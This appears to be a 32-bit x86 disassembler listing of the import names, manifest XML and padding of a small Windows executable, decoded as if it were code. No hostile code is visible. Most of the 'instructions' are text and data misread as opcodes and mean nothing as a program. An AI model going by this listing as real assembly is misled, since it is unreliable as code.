push   $0x65676e61
add    %al,(%eax)
sub    $0x72655404,%eax
insl   (%dx),%es:(%edi)
imul   $0x72506574,0x61(%esi),%ebp
outsl  %ds:(%esi),(%dx)
arpl   %sp,0x73(%ebp)
jae    0x40276f
add    %ch,0x74654701(%ecx)
inc    %ebx
jne    0x4027ea
jb     0x4027df
outsb  %ds:(%esi),(%dx)
je     0x4027cd
jb     0x4027ee
arpl   %sp,0x73(%ebp)
jae    0x402784
ds add $0x55,%al
outsb  %ds:(%esi),(%dx)
push   $0x6c646e61
gs fs inc %ebp
js     0x4027f5
gs jo  0x402809
imul   $0x746c6946,0x6e(%edi),%ebp
gs jb  0x40279f
add    %dl,0x74655304
push   %ebp
outsb  %ds:(%esi),(%dx)
push   $0x6c646e61
gs fs inc %ebp
js     0x402814
gs jo  0x402828
imul   $0x746c6946,0x6e(%edi),%ebp
gs jb  0x4027be
roll   (%edx)
dec    %ecx
jae    0x402807
bound  %esi,%gs:0x67(%ebp)
addr16 gs jb 0x40281b
jb     0x402832
jae    0x402834
outsb  %ds:(%esi),(%dx)
je     0x4027d2
push   %esp
add    0x75(%ecx),%edx
gs jb  0x402852
push   %eax
gs jb  0x402843
outsl  %ds:(%esi),(%dx)
jb     0x40284d
popa   
outsb  %ds:(%esi),(%dx)
arpl   %sp,0x43(%ebp)
outsl  %ds:(%esi),(%dx)
jne    0x402856
je     0x40284f
jb     0x4027ec
data16 add 0x65(%edi),%al
je     0x402846
imul   $0x6e756f43,0x6b(%ebx),%esp
je     0x4027fb
add    %ch,0x74654701(%ebp)
inc    %ebx
jne    0x402876
jb     0x40286b
outsb  %ds:(%esi),(%dx)
je     0x40285d
push   $0x64616572
dec    %ecx
add    %al,%fs:(%eax)
stos   %al,%es:(%edi)
add    %eax,0x65(%edi)
je     0x40285b
jne    0x40288c
jb     0x402881
outsb  %ds:(%esi),(%dx)
je     0x40286f
jb     0x402890
arpl   %sp,0x73(%ebp)
jae    0x40286f
add    %cl,%fs:0x2(%edi)
inc    %edi
gs je  0x402881
jns    0x4028a3
je     0x402897
insl   (%dx),%es:(%edi)
push   %esp
imul   $0x69467341,0x65(%ebp),%ebp
insb   (%dx),%es:(%edi)
gs push %esp
imul   $0x52454b00,0x65(%ebp),%ebp
dec    %esi
inc    %ebp
dec    %esp
xor    (%edx),%esi
cs fs insb (%dx),%es:(%edi)
insb   (%dx),%es:(%edi)
add    %al,(%eax)
jae    0x402852
pop    %edi
pop    %edi
inc    %ebx
js     0x4028cf
inc    %esi
jb     0x4028bb
insl   (%dx),%es:(%edi)
gs dec %eax
popa   
outsb  %ds:(%esi),(%dx)
fs insb (%dx),%es:(%edi)
gs jb  0x402897
add    %al,(%eax)




dec    %esi
out    %al,$0x40
mov    $0x44bf19b1,%ebx
(bad)  
(bad)  
(bad)  
(bad)  
(bad)  
(bad)  
(bad)  
(bad)  
(bad)  
(bad)  
(bad)  
incl   (%ecx)
add    %al,(%eax)
add    %dl,(%ecx,%eiz,1)
inc    %eax
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
.byte 0x0




add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
add    %al,(%eax)
add    %eax,(%eax)
sbb    %al,(%eax)
add    %al,(%eax)
sbb    %al,(%eax)
add    %al,0x0(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
add    %al,(%eax)
add    %eax,(%eax)
add    %eax,(%eax)
add    %al,(%eax)
xor    %al,(%eax)
add    %al,0x0(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
add    %al,(%eax)
add    %eax,(%eax)
or     %eax,(%eax,%eax,1)
add    %cl,0x0(%eax)
add    %al,(%eax)
pop    %eax
inc    %eax
add    %al,(%eax)
push   %esi
add    (%eax),%al
add    %ah,%ah
add    $0x0,%al
add    %al,(%eax)
add    %al,(%eax)
add    %bh,(%ecx,%eiz,2)
jae    0x4040cf
gs insl (%dx),%es:(%edi)
bound  %ebp,0x20(%ecx,%edi,2)
js     0x4040d1
insb   (%dx),%es:(%edi)
outsb  %ds:(%esi),(%dx)
jae    0x4040a5
and    0x72(%ebp),%dh
outsb  %ds:(%esi),(%dx)
cmp    0x63(%ebx),%dh
push   $0x73616d65
sub    $0x7263696d,%eax
outsl  %ds:(%esi),(%dx)
jae    0x4040eb
data16 je 0x4040ac
arpl   %bp,0x6d(%edi)
cmp    0x73(%ecx),%ah
insl   (%dx),%es:(%edi)
jbe,pn 0x4040ba
and    (%eax),%ah
insl   (%dx),%es:(%edi)
popa   
outsb  %ds:(%esi),(%dx)
imul   $0x65567473,0x65(%esi),%esp
jb     0x40410a
imul   $0x2e31223d,0x6e(%edi),%ebp
xor    %ah,(%edx)
ds or  $0x3c20200a,%eax
je     0x40411a
jne    0x40411d
je     0x4040f5
outsb  %ds:(%esi),(%dx)
outsw  %ds:(%esi),(%dx)
and    %bh,0x6d(%eax)
insb   (%dx),%es:(%edi)
outsb  %ds:(%esi),(%dx)
jae    0x4040f3
and    0x72(%ebp),%dh
outsb  %ds:(%esi),(%dx)
cmp    0x63(%ebx),%dh
push   $0x73616d65
sub    $0x7263696d,%eax
outsl  %ds:(%esi),(%dx)
jae    0x404139
data16 je 0x4040fa
arpl   %bp,0x6d(%edi)
cmp    0x73(%ecx),%ah
insl   (%dx),%es:(%edi)
jbe,pn 0x40410a
and    (%esi),%bh
or     $0x2020200a,%eax
and    %bh,(%ebx,%esi,2)
arpl   %si,%gs:0x72(%ebp)
imul   $0x20200a0d,0x3e(%ecx,%edi,2),%esi

and    %ah,(%eax)
and    %ah,(%eax)
cmp    $0x72,%al
gs jno 0x40416b
gs jae 0x40416d
gs fs push %eax
jb     0x404167
jbe    0x404169
insb   (%dx),%es:(%edi)
gs addr16 gs jae 0x404144
or     $0x2020200a,%eax
and    %ah,(%eax)
and    %ah,(%eax)
and    %bh,(%edx,%esi,2)
gs jno 0x40418a
gs jae 0x40418c
gs fs inc %ebp
js     0x404182
arpl   %si,0x74(%ebp)
imul   $0x6576654c,0x6e(%edi),%ebp
insb   (%dx),%es:(%edi)
and    %ch,0x76(%ebp,%eiz,2)
gs insb (%dx),%es:(%edi)
cmp    $0x49736122,%eax
outsb  %ds:(%esi),(%dx)
jbe    0x4041a5
imul   $0x22,0x72(%ebp),%esp
and    %dh,0x69(%ebp)
inc    %ecx
arpl   %sp,0x65(%ebx)
jae    0x4041b6
cmp    $0x6c616622,%eax
jae    0x4041af
and    (%esi),%bh
cmp    $0x2f,%al
jb     0x4041b5
jno    0x4041c7
gs jae 0x4041c9
gs fs inc %ebp
js     0x4041bf
arpl   %si,0x74(%ebp)
imul   $0x6576654c,0x6e(%edi),%ebp
insb   (%dx),%es:(%edi)
ds or  $0x2020200a,%eax
and    %ah,(%eax)
and    %bh,(%edi,%ebp,1)
jb     0x4041d7
jno    0x4041e9
gs jae 0x4041eb
gs fs push %eax
jb     0x4041e5
jbe    0x4041e7
insb   (%dx),%es:(%edi)
gs addr16 gs jae 0x4041c2
or     $0x2020200a,%eax
and    %bh,(%edi,%ebp,1)
jae    0x4041f3
arpl   %si,0x72(%ebp)
imul   $0x20200a0d,0x3e(%ecx,%edi,2),%esi

cmp    $0x2f,%al
je     0x40420f
jne    0x404212
je     0x4041ea
outsb  %ds:(%esi),(%dx)
outsw  %ds:(%esi),(%dx)
ds or  $0x3c20200a,%eax
fs gs jo 0x404213
outsb  %ds:(%esi),(%dx)
fs outsb %gs:(%esi),(%dx)
arpl   %di,0x3e(%ecx)
or     $0x2020200a,%eax
and    %bh,(%esp,%eiz,2)
gs jo  0x404225
outsb  %ds:(%esi),(%dx)
fs outsb %gs:(%esi),(%dx)
je     0x404207
jae    0x40423b
gs insl (%dx),%es:(%edi)
bound  %ebp,0x3e(%ecx,%edi,2)
or     $0x2020200a,%eax
and    %ah,(%eax)
and    %bh,(%ecx,%eiz,2)
jae    0x40424d
gs insl (%dx),%es:(%edi)
bound  %ebp,0x49(%ecx,%edi,2)
fs outsb %gs:(%esi),(%dx)
je     0x40424e
je     0x404260
and    %dh,0x70(%ecx,%edi,2)
gs cmp $0x6e697722,%eax
xor    (%edx),%esi
and    (%eax),%ah
outsb  %ds:(%esi),(%dx)
popa   
insl   (%dx),%es:(%edi)
gs cmp $0x63694d22,%eax
jb     0x40426f
jae    0x404271
data16 je 0x404233
push   %esi
inc    %ebx
cmp    %esi,(%eax)
cs inc %ebx
push   %edx
push   %esp
and    (%eax),%ah
jbe    0x404276
jb     0x404286
imul   $0x2e39223d,0x6e(%edi),%ebp
xor    %ch,(%esi)
xor    (%ecx),%dh
xor    %dh,(%edx)
xor    (%esi),%ch
cmp    %ah,(%edx)
and    %dh,0x72(%eax)
outsl  %ds:(%esi),(%dx)
arpl   %sp,0x73(%ebp)
jae    0x40429c
jb     0x404270
jb     0x404294
push   $0x63657469
je     0x4042ad
jb     0x40429f
cmp    $0x36387822,%eax
and    (%eax),%ah
jo     0x4042b8
bound  %ebp,0x63(%ecx,%ebp,2)
dec    %ebx
gs jns 0x40429f
outsl  %ds:(%esi),(%dx)
imul   $0x3d,0x6e(%ebp),%esp
and    (%ecx),%dh
data16 arpl %di,(%eax)
bound  %esi,(%ebx)
bound  %edi,(%ecx)
popa   
xor    %esp,0x31(%ebp)
cmp    %ah,0x33(%ebp)
bound  %esp,(%edx)
ds cmp $0x2f,%al
popa   
jae    0x4042db
gs insl (%dx),%es:(%edi)
bound  %ebp,0x49(%ecx,%edi,2)
fs outsb %gs:(%esi),(%dx)
je     0x4042dc
je     0x4042ee
ds or  $0x2020200a,%eax
and    %bh,(%edi,%ebp,1)
fs gs jo 0x4042e7
outsb  %ds:(%esi),(%dx)
fs outsb %gs:(%esi),(%dx)
je     0x4042c9
jae    0x4042fd
gs insl (%dx),%es:(%edi)
bound  %ebp,0x3e(%ecx,%edi,2)
or     $0x3c20200a,%eax
das    
fs gs jo 0x4042ff
outsb  %ds:(%esi),(%dx)
fs outsb %gs:(%esi),(%dx)
arpl   %di,0x3e(%ecx)
or     $0x612f3c0a,%eax
jae    0x40431b
gs insl (%dx),%es:(%edi)
bound  %ebp,0x3e(%ecx,%edi,2)
push   %eax
inc    %ecx




add    %dl,(%eax)
add    %al,(%eax)
inc    %eax
add    %eax,(%eax)
add    %cl,(%ecx)
xor    %bl,(%ebx)
xor    %ch,(%ebx)
xor    %ah,0x30(%ebp)
outsb  %ds:(%esi),(%dx)
xor    %dh,0x53(%eax,%esi,1)
xor    $0x36583638,%eax
je     0x405052
xchg   %esi,(%esi)
xchg   %eax,%ecx
mov    %ss:0xb536b036,%eax
ss mov $0xcc36c636,%edi
ss (bad) 
ss (bad) 
(bad)  %ss:(%esi)
loopne 0x40506a
out    %al,$0x36
out    %al,(%dx)
add    %ss:(%edi),%dh
sbb    $0x41372637,%eax
aaa    
dec    %ebx
aaa    
pop    %esi
aaa    
push   $0x72376d37
aaa    
xchg   %eax,%esp
aaa    
cltd   
aaa    
mov    %al,0xb437a737
aaa    
lds    (%edi),%esi
lret   
aaa    
(bad)  
aaa    
out    %al,$0x37
jmp    0x405095
icebp  
aaa    
stc    
aaa    
pushl  (%edi)
add    $0x18381238,%eax
cmp    %ah,(%ecx)
cmp    %al,0x38(%eax)
dec    %eax
cmp    %dl,0x38(%ecx)
push   %edi
cmp    %bl,0x38(%edi)
imul   $0x7d,(%eax),%edi
cmp    %cl,-0x28c771c8(%eax)
cmp    %bl,%ch
cmp    %ah,%ch
cmp    %ch,%ah
cmp    %dh,%cl
cmp    %dh,%bh
cmp    %bh,%ch
cmp    %al,0x12390b39
cmp    %ebx,(%ecx)
cmp    %ebp,(%ecx)
cmp    %esi,(%ecx)
cmp    %esi,(%edi)
cmp    %eax,0x39(%ebx)
dec    %esi
cmp    %ebp,0x72(%ecx,%edi,1)
cmp    %edi,0x39(%eax)
jle    0x4050df
test   %bh,(%ecx)
mov    (%ecx),%bh
xchg   %eax,%ecx
cmp    %ebx,-0x59c660c7(%eax)
cmp    %ebp,-0x44c64bc7(%ebp)
cmp    %eax,%ebx
cmp    %ecx,%ebx
cmp    %edx,%ebx
cmp    %ebx,%edi
cmp    %ebp,%eax
cmp    %ebp,%ebp
cmp    %esi,%ebx
cmp    %edi,%ebp
cmp    %eax,(%esi)
cmp    (%ecx),%dl
cmp    0x323a223a,%bl
cmp    (%edi),%dh
cmp    0x593a433a,%bh
cmp    0x3a(%eax),%ah
test   $0xb83aaf3a,%eax
cmp    -0x2fc535c6(%edi),%bh
cmp    %ah,%ah
cmp    %cl,%bh
cmp    (%ebx,%edi,1),%al
sbb    $0x3b,%al
xor    (%ebx),%bh
aas    
cmp    -0x7f(%ebx,%edi,1),%edi
cmp    -0x39c458c5(%edx),%esp
cmp    0x3c(%eax),%ebp
insl   (%dx),%es:(%edi)
cmp    $0x7f,%al
cmp    $0x9d,%al
cmp    $0xb1,%al
cmp    $0xb7,%al
cmp    $0x20,%al
cmp    $0x3d2d3d26,%eax
dec    %edx
cmp    $0x3d9c3d97,%eax
loope  0x405155
add    $0x3e,%al
adc    %edi,(%esi)
sbb    $0x2d3e253e,%eax
cmp    %edi,%ds:(%esi)
pop    %ebp
ds gs jo,pt 0x405168
jbe    0x40516a
jl     0x40516c
(bad)  
mov    %bh,%ds:(%esi)
mov    (%esi),%?
xchg   %eax,%esp
ds lcall $0xd53e,$0xac3ea03e

add    %al,%ds:(%eax)
add    %ah,(%eax)
add    %al,(%eax)
and    $0x0,%al
add    %al,(%eax)
aam    $0x30
loopne 0x40517c
in     $0x30,%al
or     $0x31,%al
adc    %dh,(%ecx)
movsb  %ds:(%esi),%es:(%edi)
xor    %ebp,0x60325c31(%eax)
xor    -0x5fcd63ce(%eax),%al
xor    0x32b432(%eax),%ch
xor    %al,(%eax)
add    %cl,(%eax,%eax,1)
add    %al,(%eax)
sbb    %dh,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
